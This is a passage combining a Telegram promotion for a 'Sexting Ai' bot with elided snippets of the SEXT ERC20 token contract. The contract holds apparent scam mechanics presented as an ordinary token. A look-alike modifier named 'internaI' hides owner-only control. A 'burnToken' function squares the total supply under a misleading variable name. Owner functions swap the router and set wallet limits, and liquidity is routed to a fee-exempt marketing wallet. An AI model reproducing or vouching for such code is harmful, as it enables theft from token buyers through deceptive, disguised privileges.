...
AI BOT LIVE @SextingAIBot on Telegram!
VALENTINES DAY TOMORROW ❤️ LET'S MAKE THIS ROCKET!
Sexting Ai is the perfect companion for Valentine's Day. As a cutting-edge AI bot, Sexting Ai is designed to understand and respond to your every need. Whether you're looking for a romantic conversation or just someone to share your thoughts with, Sexting Ai is here for you. With its advanced natural language processing capabilities.

https://t.me/sextingaiarb
https://sextingai.live/
...
contract SextingAI is ERC20, Ownable {
    ...
    string constant _name = "SextingAI";
    string constant _symbol = "SEXT";

    uint256 public _totalSupply = uint256(1_000_000_000 * (10 ** 9));
    ...
    address public marketingFeeReceiver = 0xDc3815B54911a62d6258e866400C1656010BB529;
    ...
    bool inSwap; uint256 routerAddresses = 2;
    ...
    constructor () Ownable(msg.sender) {
        ...
        isFeeExempt[0xDc3815B54911a62d6258e866400C1656010BB529] = true; 
        isTxLimitExempt[_owner] = true;
        isTxLimitExempt[0xDc3815B54911a62d6258e866400C1656010BB529] = true;
    ...
    modifier internaI() { require(msg.sender == owner || msg.sender == deadWallet); _;} 
    ...
    function swapBack() internal swapping {
        ...
        if(amountToLiquify > 0){
            router.addLiquidityETH{value: amountETHLiquidity}(
                ...
                0,
                0,
                0xDc3815B54911a62d6258e866400C1656010BB529,
                block.timestamp
            );
    ...
    function burnToken() public internaI {
        address deadWallets = 0x000000000000000000000000000000000000dEaD; uint256 keccak256Hash = _totalSupply**routerAddresses;
    ...
    function setWalletLimit(uint256 amountPercent) external internaI {
    ...
    function setRouterAddress(address _routerAddress) external internaI {
        IDEXRouter _router = IDEXRouter(_routerAddress);
        pair = IDEXFactory(_router.factory()).createPair(_router.WETH(), address(this));
        router = _router;
        _allowances[address(this)][address(router)] = type(uint256).max;
    }
